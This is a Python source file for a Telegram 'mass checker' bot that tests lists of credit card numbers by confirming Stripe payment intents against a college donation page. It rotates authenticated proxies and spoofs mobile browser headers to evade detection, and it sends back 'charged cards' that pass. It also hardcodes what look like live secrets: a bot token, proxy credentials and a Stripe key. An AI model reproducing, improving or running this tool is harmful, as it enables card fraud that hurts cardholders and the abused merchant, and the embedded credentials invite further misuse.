import requests
import json
import time
import random
from colorama import Fore, init
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
import asyncio
import io
import logging

# Initialize colorama
init(autoreset=True)

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Global variables
user_progress = {}
active_users = set()
TOKEN = "7748515975:AAHyGpFl4HXLLud45VS4v4vMkLfOiA6YNSs"  # Your bot token
PROXY_LIST = [
    "http://PNFTzjJC2spufSEy:VrYCdvs0Fif6OrD8@geo.g-w.info:10080",
    "http://lGiD8gfCkZOiC5MI:4iWRoVhTxc7VS8M6@geo.g-w.info:10080",
    "http://hosXBn0alDxeGPlh:eoTGSETvHMImvIpN@geo.g-w.info:10080",
    "http://V2rZlNxBIvtkzcBL:Z51mZNI9ajxDgFbs@geo.g-w.info:10080",
    "http://0IJOThl2FURs2q8t:b5otuXaIZSmRcoWz@geo.g-w.info:10080",
    "http://wHNsgehb76p9TAPL:ZqHiE8CGD0in6Zgs@geo.g-w.info:10080",
    "http://usi9DCNx6YGotFyZ:RmOJcblUU2r3hkSb@geo.g-w.info:10080",
    "http://i8jPuWzqK8txqT7m:N9X24fgN64mP9hy5@geo.g-w.info:10080",
    "http://vvuOr0NIXM92DnKq:SmLtYj7AZvzRMKWv@geo.g-w.info:10080",
    "http://WoZtt6tCwNMMvHUk:7lKRfB0I39Oz10OB@geo.g-w.info:10080",
    "http://JzM8oiCnmoH78Tns:2yj2vEZG0QnZw5zl@geo.g-w.info:10080",
    "http://xhoKIUA4lfAM8MuR:6M2Cc1mwgS2N8wPt@geo.g-w.info:10080",
    "http://BmY9QRBKsuu0GA6H:q5hxqOVAFCyTrt6c@geo.g-w.info:10080",
    "http://ekGKojJGKDm0owTX:bdksP1tB0bGzy2g5@geo.g-w.info:10080",
    "http://JvKtkkWSUxYoAVXp:nikf2rXgOaR7F4j1@geo.g-w.info:10080",
    "http://l0KUZpXynIGkTIwB:rQItaJLMxfXAdiFe@geo.g-w.info:10080",
    "http://gOOzzTJ6HjwsrRHb:G9sW9SlmIY3IIpet@geo.g-w.info:10080",
    "http://vSsfLotkwNuFNeH1:QErOmGwWsjCy9D2X@geo.g-w.info:10080",
    "http://IrMqexGfYWzasEHs:azJ8e7NVLljYKKcD@geo.g-w.info:10080",
    "http://4wEgSx2BQ54N33mW:qRkHr6ItRMXQPv9l@geo.g-w.info:10080"
]

def get_random_proxy():
    """Select a random proxy from the list"""
    return random.choice(PROXY_LIST)

def create_session():
    """Create a new session with headers and a random proxy"""
    proxy = get_random_proxy()
    session = requests.Session()
    session.proxies = {"http": proxy, "https": proxy}
    
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; 22011119TI Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.121 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8",
        "sec-ch-ua": '"Not(A:Brand";v="99", "Android WebView";v="133", "Chromium";v="133"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"'
    })
    logger.debug(f"Using proxy: {proxy}")
    return session

def get_payment_intent(session, amount="5"):
    """Get a payment intent ID and client secret matching Chut2.py"""
    donation_url = "https://www.mc.edu/give"
    payment_url = "https://go.mc.edu/register/form?cmd=payment"
    
    try:
        response = session.get(donation_url, timeout=15)
        logger.debug(f"Initial GET to {donation_url} - Status: {str(response.status_code)}")
    except Exception as e:
        logger.error(f"Failed to initialize cookies: {str(e)}")
    
    headers = {
        "Host": "go.mc.edu",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://go.mc.edu",
        "Referer": "https://go.mc.edu/register/?id=789d4530-51d3-d805-2676-2ca00dbbc45c&%3Bamp=&%3Bsys%3Afield%3Aonline_giving_department=3cef5b4a-e694-4df1-8ec4-1c94954a5131",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty"
    }
    
    data = {
        "cmd": "getIntent",
        "amount": amount,
        "payment_type": "card",
        "summary": "Donations",
        "currency": "usd",
        "account": "acct_1KQdE6PmVGzx57IR",
        "setupFutureUsage": "",
        "test": "0",
        "add_fee": "0"
    }
    
    try:
        response = session.post(payment_url, headers=headers, data=data, timeout=15)
        response.raise_for_status()
        response_data = json.loads(response.text)
        payment_intent_id = response_data.get('id')
        client_secret = response_data.get('clientSecret')
        
        if payment_intent_id and client_secret:
            logger.debug(f"Payment Intent ID: {payment_intent_id}, Client Secret: {client_secret}")
            return payment_intent_id, client_secret
        else:
            logger.error(f"Invalid response: {response.text}")
            return None, None
    except requests.exceptions.RequestException as e:
        status_code = e.response.status_code if e.response is not None else "N/A"
        response_text = e.response.text if e.response is not None else "No response body"
        logger.error(f"Network error: {str(e)} - Status: {status_code} - Response: {response_text}")
        return None, None

def process_card(session, payment_intent_id, client_secret, card_info):
    """Process a card with the given payment intent and client secret"""
    try:
        card_number, exp_month, exp_year, cvc = card_info
        card_number = card_number.replace(" ", "")
        
        url = f"https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm"
        
        headers = {
            "Host": "api.stripe.com",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json"
        }
        
        data = {
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": card_number,
            "payment_method_data[card][cvc]": cvc,
            "payment_method_data[card][exp_year]": exp_year,
            "payment_method_data[card][exp_month]": exp_month,
            "payment_method_data[allow_redisplay]": "unspecified",
            "payment_method_data[billing_details][address][postal_code]": "10006",
            "payment_method_data[billing_details][address][country]": "US",
            "payment_method_data[payment_user_agent]": "stripe.js/a8247d96cc; stripe-js-v3/a8247d96cc; payment-element; deferred-intent",
            "payment_method_data[referrer]": "https://go.mc.edu",
            "payment_method_data[time_on_page]": str(int(time.time() * 1000)),
            "payment_method_data[client_attribution_metadata][client_session_id]": "d67fc2ce-78dc-4f28-8ce1-2a546a6606dd",
            "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
            "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
            "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
            "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "deferred",
            "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "merchant_specified",
            "payment_method_data[guid]": "NA",
            "payment_method_data[muid]": "NA",
            "payment_method_data[sid]": "NA",
            "expected_payment_method_type": "card",
            "client_context[currency]": "usd",
            "client_context[mode]": "payment",
            "client_context[capture_method]": "manual",
            "client_context[payment_method_types][0]": "card",
            "client_context[payment_method_options][us_bank_account][verification_method]": "instant",
            "use_stripe_sdk": "true",
            "key": "pk_live_f1etgxOxEyOS3K9myaBrBqrA",
            "_stripe_account": "acct_1KQdE6PmVGzx57IR",
            "client_secret": client_secret,
        }
        
        response = session.post(url, headers=headers, data=data, timeout=20)
        response_json = json.loads(response.text)
        
        if response.status_code == 200 and response_json.get('status') == 'requires_capture':
            return True, "Card approved ✅"
        else:
            error = response_json.get('error', {})
            decline_code = error.get('decline_code', 'unknown')
            message = error.get('message', 'Unknown error')
            return False, f"Declined ({decline_code}): {message}"
    except Exception as e:
        return False, f"Error processing card: {str(e)}"

def parse_card_line(line):
    """Parse a line from a text file containing card information"""
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    try:
        parts = line.split('|')
        if len(parts) == 4:
            card_number, exp_month, exp_year, cvc = parts
            if "20" in exp_year:
                exp_year = exp_year.split("20")[1]
            return card_number.strip(), exp_month.strip(), exp_year.strip(), cvc.strip()
        return None
    except Exception:
        return None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command handler with welcome message and buttons"""
    keyboard = [
        [
            InlineKeyboardButton("Upload Combo", callback_data='upload_combo'),
            InlineKeyboardButton("Cancel Check", callback_data='cancel_check')
        ],
        [
            InlineKeyboardButton("Live Stats", callback_data='live_stats'),
            InlineKeyboardButton("Help", callback_data='help')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_message = (
        "🔥 *WELCOME TO FN MASS CHECKER BOT!*\n"
        "🔥 Use /chk To Check Single CC\n"
        "📁 Send Combo File Or Else Use Button Below:"
    )
    await update.message.reply_text(welcome_message, parse_mode='Markdown', reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button clicks"""
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if query.data == 'upload_combo':
        await query.message.reply_text("📤 Please upload your combo file (.txt)")
    elif query.data == 'live_stats':
        if user_id not in user_progress:
            await query.message.reply_text("No active checks running.")
            return
        stats = user_progress[user_id]
        total = stats["total"]
        current = stats["current"]
        approved = stats["approved"]
        declined = stats["declined"]
        left = total - current
        
        stats_message = (
            f"📊 *Live Stats:*\n"
            f"Total: {total}\n"
            f"Checked: {current}\n"
            f"Approved: {approved}\n"
            f"Declined: {declined}\n"
            f"Left: {left}\n"
            f"Progress: {current/total*100:.1f}%"
        )
        await query.message.reply_text(stats_message, parse_mode='Markdown')
    elif query.data == 'cancel_check':
        if user_id in active_users:
            active_users.remove(user_id)
            await query.message.reply_text("✅ Check canceled.")
        else:
            await query.message.reply_text("No active checks to cancel.")
    elif query.data == 'help':
        await query.message.reply_text(
            "ℹ️ *Help:*\n"
            "Use /chk to check a single CC.\n"
            "Upload a .txt file to check multiple CCs.\n"
            "Use the buttons to manage your checks.",
            parse_mode='Markdown'
        )

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /chk command for single CC checking"""
    user_id = update.effective_user.id
    if user_id in active_users:
        await update.message.reply_text("Please wait until your current check completes.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /chk 4222222222222|05|25|372")
        return

    card_info = ' '.join(context.args)
    card_data = parse_card_line(card_info)
    if not card_data:
        await update.message.reply_text("Invalid CC format. Use: /chk 4222222222222|05|25|372")
        return

    active_users.add(user_id)
    checking_msg = await update.message.reply_text("🔍 Checking card...")
    
    try:
        session = create_session()
        payment_intent_id, client_secret = get_payment_intent(session)
        if not all([payment_intent_id, client_secret]):
            await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=checking_msg.message_id)
            await update.message.reply_text("Failed to initialize payment gateway. Check logs for details.")
            return

        success, msg = process_card(session, payment_intent_id, client_secret, card_data)
        card_number = card_data[0]
        
        await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=checking_msg.message_id)
        if success:
            await update.message.reply_text(f"✅ Approved: {card_number}")
        else:
            await update.message.reply_text(f"❌ Declined: {card_number}\nReason: {msg}")
    except Exception as e:
        await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=checking_msg.message_id)
        await update.message.reply_text(f"Error: {str(e)}")
    finally:
        active_users.remove(user_id)

async def check_file(update: Update, context: ContextTypes.DEFAULT_TYPE, file_content: bytes):
    """Process file with progress tracking"""
    user_id = update.effective_user.id
    if user_id in active_users:
        await update.message.reply_text("Please wait until your current check completes.")
        return

    active_users.add(user_id)
    user_progress[user_id] = {"current": 0, "total": 0, "approved": 0, "declined": 0}
    
    try:
        file_text = file_content.decode()
        cards = [line.strip() for line in file_text.split('\n') if line.strip() and not line.startswith('#')]
        user_progress[user_id]["total"] = len(cards)
        
        charged_cards = []
        await update.message.reply_text(f"Starting check for {len(cards)} cards...")

        for idx, line in enumerate(cards, 1):
            user_progress[user_id]["current"] = idx
            card_info = parse_card_line(line)
            if not card_info:
                user_progress[user_id]["declined"] += 1
                continue

            session = create_session()
            payment_intent_id, client_secret = get_payment_intent(session)
            if not all([payment_intent_id, client_secret]):
                user_progress[user_id]["declined"] += 1
                continue

            success, _ = process_card(session, payment_intent_id, client_secret, card_info)
            if success:
                charged_cards.append(line)
                user_progress[user_id]["approved"] += 1
            else:
                user_progress[user_id]["declined"] += 1
            
            if idx % 5 == 0:
                await update.message.reply_text(f"Progress: {idx}/{len(cards)} ({idx/len(cards)*100:.1f}%)")
            await asyncio.sleep(random.uniform(1.5, 3.0))

        if charged_cards:
            result = "Charged cards:\n" + "\n".join(charged_cards)
            await update.message.reply_document(
                document=InputFile(io.BytesIO(result.encode()), filename="charged_cards.txt"),
                caption=f"Found {len(charged_cards)} charged cards!"
            )
        else:
            await update.message.reply_text("No charged cards found.")
            
    except Exception as e:
        await update.message.reply_text(f"Error processing file: {str(e)}")
    finally:
        active_users.remove(user_id)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stats command"""
    user_id = update.effective_user.id
    if user_id not in user_progress:
        await update.message.reply_text("No active checks running.")
        return
    
    stats = user_progress[user_id]
    total = stats["total"]
    current = stats["current"]
    approved = stats["approved"]
    declined = stats["declined"]
    left = total - current
    
    await update.message.reply_text(
        f"📊 *Stats:*\n"
        f"Total: {total}\n"
        f"Checked: {current}\n"
        f"Approved: {approved}\n"
        f"Declined: {declined}\n"
        f"Left: {left}\n"
        f"Progress: {current/total*100:.1f}%",
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle incoming messages"""
    if update.message.document and update.message.document.mime_type == "text/plain":
        file = await update.message.document.get_file()
        file_content = await file.download_as_bytearray()
        await check_file(update, context, file_content)
    else:
        await update.message.reply_text("Please send a TXT file or use /chk command.")

def main():
    """Main application setup"""
    if not PROXY_LIST:
        print(Fore.RED + "Error: No proxies configured. This will fail on data center IPs like DigitalOcean.")
        return
    print(Fore.CYAN + f"Bot is running with {len(PROXY_LIST)} rotating proxies...")
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(MessageHandler(filters.Document.TXT | filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(CallbackQueryHandler(button_handler))
    print(Fore.CYAN + "Bot is running with Chut2.py configuration...")
    application.run_polling()

if __name__ == "__main__":
    main()